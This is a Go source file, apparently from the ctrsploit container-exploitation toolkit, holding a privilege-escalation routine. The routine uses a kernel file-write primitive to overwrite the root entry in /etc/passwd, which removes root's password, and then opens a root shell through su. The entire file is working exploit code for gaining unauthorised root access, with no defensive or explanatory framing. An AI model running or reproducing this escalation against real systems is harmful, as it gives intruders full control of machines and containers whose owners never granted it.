package pipe_primitive

import (
	"fmt"

	"github.com/ctrsploit/ctrsploit/pkg/util"
)

func Escalate(primitive Primitive) (err error) {
	if err := util.CheckRootShellBySu(); err != nil {
		return fmt.Errorf(
			"%s privilege escalate: no usable su-compatible root shell before patching /etc/passwd: %w",
			primitive.GetExpName(), err,
		)
	}

	offset, err := getRootPasswdOffset()
	if err != nil {
		return
	}
	payload := []byte(":0:0:root:/root:/bin/bash\n")
	err = primitive.Write("/etc/passwd", int64(offset), payload)
	if err != nil {
		return
	}
	if err := util.InvokeRootShellBySu(); err != nil {
		return fmt.Errorf(
			"%s privilege escalate: /etc/passwd was patched, but invoking a su-compatible root shell failed: %w",
			primitive.GetExpName(), err,
		)
	}
	return nil
}
